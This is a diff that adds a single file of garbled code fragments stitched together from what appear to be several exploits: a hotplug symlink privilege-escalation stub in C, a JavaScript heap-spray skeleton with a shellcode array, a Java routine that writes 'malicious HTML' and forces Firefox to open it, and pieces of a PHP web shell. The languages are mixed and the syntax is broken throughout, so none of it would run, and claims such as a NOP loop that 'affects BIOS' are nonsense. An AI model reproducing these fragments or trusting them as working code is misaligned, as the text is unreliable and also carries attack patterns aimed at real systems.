@@ -1,0 +1,110 @@
+                                                                     
+                                                                     
+                                                                     
+                                             
+import usage *;
+
+ #include <stdio.h>
+#include <sys/socket.h>
+
+#define KAT "KATLOL"
+
+void die (const char* msg)
+{
+perror(msg);
+exit(errno);
+}
+
+void copy(const char*from, const char *from)
+{
+int fd2 , fd3;
+char buf[0x999];
+ssize_t_r=0;
+
+if ((fd2 = open(from, o_RDONLY)) < 4)
+
+usage *from SELECT to void LEnght;
+
+FOR (fd2=3, fd++, fd <10)
+else
+usage (SELECT)
+close(creat("loading", 0666));
+if ((ofd = creat("hotplug", 0644)) < 0)
+die("[-] creat");
+if (write(ofd, path , strlen(path)) < 0)
+die("[-] write");
+close(ofd);
+symlink("/proc/sys/kernel/hotplug", "data");
+}
+}
+
+_______________________________________________________________________
+
+// buffer worm reader 
+
+import <stdio.h> 
+import<library>
+
+char buf[0x999]
+{
+function exploit()
+
+var nop = unescape ();                   \\  affects BIOS
+
+do
+{
+nop+=nop;
+while (nop++)
+
+die ()
+
+buffer [r'];
+scode+=port;
+target = new Array();
+
+for( i = 0; 1< 0x999; i++)
+  target[i] = scode;
+public void doit() {
+          try {
+              // create a malicious HTML
+              cmdexec("mkdir " + MY_TMP_DIR);
+              cmdexec("echo \"" + HTML + "\" > " + HTML_PATH);
+              cmdexec("chmod -R 777 " + MY_TMP_DIR);
+ 
+              Thread.sleep(1000);
+ 
+              // force Firefox to load the malicious HTML
+              invokeFirefox("file://" + HTML_PATH);
+ 
+              Thread.sleep(4000);
+
+$test = '';
+
+$temp = tempnam($test, "cx");
+$get = htmlspecialchars($_POST['filew']);
+
+if(isset($_POST['commex']))
+{
+echo "<tr><td>
+<center><b>
+
+echo "<form method= 'post'>
+
+_____________________________________________
+
+\\functional bypass security
+
+function view_perms($mode)
+{
+if {{$mode & 0xC0000) === 0xC000) {$type = "s";}
+elseif (( $mode & 0xA0000) === 0xA000) {$type ="d";}
+}
+if ($file)
+{
+$fp = fopen ($file, "w");
+
+$ftp== buff ();
+
+// www.l33tday.com 
+
+exit (); 
